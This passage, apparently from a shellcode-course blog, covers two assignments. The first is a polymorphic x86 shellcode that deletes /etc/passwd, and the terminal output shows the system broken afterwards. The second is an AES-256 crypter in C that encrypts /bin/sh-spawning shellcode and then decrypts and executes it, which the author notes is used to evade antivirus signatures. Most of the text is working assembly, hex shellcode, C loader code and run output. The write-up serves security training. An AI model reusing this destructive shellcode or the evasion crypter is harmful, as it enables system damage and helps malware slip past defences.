$ stat /etc/passwd
  File: ‘/etc/passwd’
  Size: 2008      	Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d	Inode: 182305      Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2017-01-08 15:11:35.774016024 -0600
Modify: 2017-01-02 14:55:00.830518000 -0600
Change: 2017-01-02 14:55:00.830518000 -0600
 Birth: -
$ sudo ./unlinkpasswd
Shellcode Length: 35
$ stat /etc/passwd
stat: cannot stat ‘/etc/passwd’: No such file or directory
$ sudo mv /etc/passwd.bkup /etc/passwd
sudo: unknown uid 1000: who are you?
$ mv /etc/passwd.bkup /etc/passwd
mv: cannot move ‘/etc/passwd.bkup’ to ‘/etc/passwd’: Permission denied
```

Lets get our polymorphism on.

## Polymorphic Unlink /etc/passwd and Exit Shellcode
First we need to replicate the jump, call, pop setup of the original shellcode:
```
global _start
section .text
  _start:
    jmp    call_shellcode

  executeit:
    pop    esi
    xor    eax,eax
    xor    ecx,ecx
    xor    edx,edx
    mov    al,0xa
    mov    ebx,esi
    int    0x80
    mov    al,0x1
    int    0x80

  call_shellcode:
    call executeit
    FileToDelete: db "/etc/passwd"
```
Next we move some things around to make our code unique:
```
global _start
section .text
  _start:
    jmp    call_shellcode

  executeit:
    pop    esi

    ; Equivilent Instructions for:
    ; xor    eax,eax

    mov    eax, ecx
    xor    eax, ecx

    xor    ecx,ecx
    xor    edx,edx

    ; Equivilent Instructions for:
    ; mov    al,0xa
    mov    al, 0xc
    sub    al, 0x2

    mov    ebx,esi
    int    0x80
    mov    al,0x1
    int    0x80

  call_shellcode:
    call executeit
    FileToDelete: db "/etc/passwd"
```
Lets see if our polymorphed instructions still accomplish their goal:
```
$ stat /etc/passwd
  File: ‘/etc/passwd’
  Size: 2008      	Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d	Inode: 182305      Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2017-01-09 16:50:23.534014000 -0600
Modify: 2017-01-02 14:55:00.830518000 -0600
Change: 2017-01-02 14:55:00.830518000 -0600
 Birth: -
$ sudo ./unlinkpasswdpoly
[sudo] password for frankgrimes:
$ stat /etc/passwd
stat: cannot stat ‘/etc/passwd’: No such file or directory
```

Beautiful! It deletes our /etc/passwd file as we hoped :) We end up with a 39 byte shellcode, the original being only 35 bytes so we are within our 150% increase.

I hope you've enjoyed learning about polymorphic shellcode!


# Assignment 7
# Custom Crypter Requirements
- Create a custom crypter like the one shown in the “crypters” video
- Free to use any encryption schema
- Use any programming language

## Context
So what is a Crypter or a Packer? From what I have read crypters and packers are quite similar. While the lines between them can blur a packer generally deals with compression and obfuscation and is often used by software companies to prevent revers-engineering their software. A crypter is focused on encryption and is a program that has grown out of the underground community. Both crypters and packers obfuscate code to deter reverse-engineering. By utilizing a crypter or packer on malicious code an attacker can increase their chances of bypassing anti-virus fingerprint/signature based detection.

## Approach
For this last SLAE problem I decided that I wanted to try and use AES 256-bit encryption for my shellcode crypter. I found some sample c code here which illustrates how to use the openssl c library for encryption/decryption. The strategy will be as follows:

Create an encrypt and decrypt c program using the sample code provided in the above link as a guide
Add the execve /bin/sh shellcode from the SLAE course into the encrypt c program
Encrypt the shellcode using the AES encryption and get an encrypted shellcode output
Place the encrypted shellcode within the decrypt program
Setup the decrypt program so that a function pointer points to the decrypted shellcode and executes it
Lets write the code.

## The Code
The assembly for the execve /bin/sh shellcode was the following:
```
global _start

section .text
_start:

	jmp short call_shellcode


shellcode:

	pop esi

	xor ebx, ebx
	mov byte [esi +7], bl
	mov dword [esi +8], esi
	mov dword [esi +12], ebx


	lea ebx, [esi]

	lea ecx, [esi +8]

	lea edx, [esi +12]

	xor eax, eax
	mov al, 0xb
	int 0x80

call_shellcode:

	call shellcode
	message db "/bin/shABBBBCCCC"
```
We compile and link the shellcode using the provided compile.sh script:
```
#!/bin/bash
echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
./compile.sh execve
```
We proceed to get the shellcode using our dumpsc function we wrote in the previous exercise:
```
function dumpsc {
objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
}
$ dumpsc execve
"\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
```
Now we have the shellcode. We proceed to write the aesencrypt.c program. Most of the code is a straight reproduction of the openssl example code with the subtraction of the decryption functionality and the addition of our shellcode:
```
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}

int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
  unsigned char *iv, unsigned char *ciphertext)
{
  EVP_CIPHER_CTX *ctx;

  int len;

  int ciphertext_len;

  /* Create and initialise the context */
  if(!(ctx = EVP_CIPHER_CTX_new())) handleErrors();

  /* Initialise the encryption operation. IMPORTANT - ensure you use a key
   * and IV size appropriate for your cipher
   * In this example we are using 256 bit AES (i.e. a 256 bit key). The
   * IV size for *most* modes is the same as the block size. For AES this
   * is 128 bits */
  if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
    handleErrors();

  /* Provide the message to be encrypted, and obtain the encrypted output.
   * EVP_EncryptUpdate can be called multiple times if necessary
   */
  if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
    handleErrors();
  ciphertext_len = len;

  /* Finalise the encryption. Further ciphertext bytes may be written at
   * this stage.
   */
  if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) handleErrors();
  ciphertext_len += len;

  /* Clean up */
  EVP_CIPHER_CTX_free(ctx);

  return ciphertext_len;
}


int main (void)
{
  /* Set up the key and iv. Do I need to say to not hard code these in a
   * real application? :-)
   */

  /* A 256 bit key */
  unsigned char *key = (unsigned char *)"01234567890123456789012345678901";

  /* A 128 bit IV */
  unsigned char *iv = (unsigned char *)"01234567890123456";

  /* Shellcode to be encrypted */
  unsigned char *plaintext =
                (unsigned char *)"\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";

  /* Buffer for ciphertext. Ensure the buffer is long enough for the
   * ciphertext which may be longer than the plaintext, dependant on the
   * algorithm and mode
   */
  unsigned char ciphertext[128];

  int ciphertext_len;

  /* Initialise the library */
  ERR_load_crypto_strings();
  OpenSSL_add_all_algorithms();
  OPENSSL_config(NULL);

  /* Encrypt the plaintext */
  ciphertext_len = encrypt (plaintext, strlen ((char *)plaintext), key, iv,
                            ciphertext);


  int counter;
  printf("Dumping Original Shellcode\n\n\n\"");
  for (counter=0; counter< strlen(plaintext); counter++)
  {
      printf("\\x%02x",plaintext[counter]);

  }

  printf("\"\n\n");

  printf("Dumping AES Encrypted Shellcode\n\n\n\"");

  for (counter=0; counter< ciphertext_len; counter++)
  {
      printf("\\x%02x",ciphertext[counter]);

  }

  printf("\"\n\n");

  /* Clean up */
  EVP_cleanup();
  ERR_free_strings();

  return 0;
}
```
When we compile this shellcode we need to remember to link the openssl library:
```
gcc aesencrypt.c -o aesencrypt -lcrypto
```
When we run the encryption program we see the following output:
```
$ ./aesencrypt
Dumping Original Shellcode

"\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"

Dumping AES Encrypted Shellcode

"\x47\xfe\x57\xcc\x1f\xd0\x4a\xf5\x34\x3e\x92\x8c\x9e\xc5\x05\x3d\xc0\xc6\x94\x48\x43\x0a\xb3\x62\xc2\x49\xef\x1d\x8b\x6a\x5e\x39\xf8\xb4\xd4\x29\xa1\x09\xfc\x99\x61\xa2\x2d\xa2\xc9\x81\x1a\x81\x9e\x3c\xf9\x7d\xb1\x3e\x5f\xde\xce\xfe\x5e\x9d\xf0\xd6\x7b\x0e"
```
We can see our original shellcode and the encrypted version as well. The next task is to write our decryption program and add the encrypted shellcode to it. Once again, most of the decryption code is just reproduced from the openssl example but I have modified it to remove the encryption related code and instead of printing out the decrypted text I instead cast it to a function pointer and execute it as our usual c stub programs have done:
```
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
  unsigned char *iv, unsigned char *plaintext)
{
  EVP_CIPHER_CTX *ctx;

  int len;

  int plaintext_len;

  /* Create and initialise the context */
  if(!(ctx = EVP_CIPHER_CTX_new())) handleErrors();

  /* Initialise the decryption operation. IMPORTANT - ensure you use a key
   * and IV size appropriate for your cipher
   * In this example we are using 256 bit AES (i.e. a 256 bit key). The
   * IV size for *most* modes is the same as the block size. For AES this
   * is 128 bits */
  if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
    handleErrors();

  /* Provide the message to be decrypted, and obtain the plaintext output.
   * EVP_DecryptUpdate can be called multiple times if necessary
   */
  if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
    handleErrors();
  plaintext_len = len;

  /* Finalise the decryption. Further plaintext bytes may be written at
   * this stage.
   */
  if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) handleErrors();
  plaintext_len += len;

  /* Clean up */
  EVP_CIPHER_CTX_free(ctx);

  return plaintext_len;
}

int main (void)
{
  /* Set up the key and iv. Do I need to say to not hard code these in a
   * real application? :-)
   */

  /* A 256 bit key */
  unsigned char *key = (unsigned char *)"01234567890123456789012345678901";

  /* A 128 bit IV */
  unsigned char *iv = (unsigned char *)"01234567890123456";

  /* Shellcode to be decrypted */
  unsigned char *ciphertext =
                (unsigned char *)"\x47\xfe\x57\xcc\x1f\xd0\x4a\xf5\x34\x3e\x92\x8c\x9e\xc5\x05\x3d\xc0\xc6\x94\x48\x43\x0a\xb3\x62\xc2\x49\xef\x1d\x8b\x6a\x5e\x39\xf8\xb4\xd4\x29\xa1\x09\xfc\x99\x61\xa2\x2d\xa2\xc9\x81\x1a\x81\x9e\x3c\xf9\x7d\xb1\x3e\x5f\xde\xce\xfe\x5e\x9d\xf0\xd6\x7b\x0e";

  /* Buffer for the decrypted text */
  unsigned char decryptedtext[128];

  int decryptedtext_len, ciphertext_len;

  /* Initialise the library */
  ERR_load_crypto_strings();
  OpenSSL_add_all_algorithms();
  OPENSSL_config(NULL);

  ciphertext_len = strlen((char *)ciphertext);

  /* Decrypt the ciphertext */
  decryptedtext_len = decrypt(ciphertext, ciphertext_len, key, iv,
    decryptedtext);

  decryptedtext[decryptedtext_len] = '\0';


  int (*ret)() = (int(*)())decryptedtext;

  ret();

  /* Clean up */
  EVP_cleanup();
  ERR_free_strings();

  printf("\"\n\n");
  return 1;
}
```
When we compile this program we need to ensure once again that we link the openssl library as well as disable stack protection and make the stack executable:
```
gcc aesdecrypt.c -o aesdecrypt -lcrypto -fno-stack-protector -z execstack
```
Perfect. Now for the moment of truth…

## Testing our custom crypter
```
$ ./aesdecrypt
$ id
uid=1000(someuser) gid=1000(someuser) groups=1000(someuser),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),999(vboxsf)
```
I hope you've enjoyed learning about custom crypters!
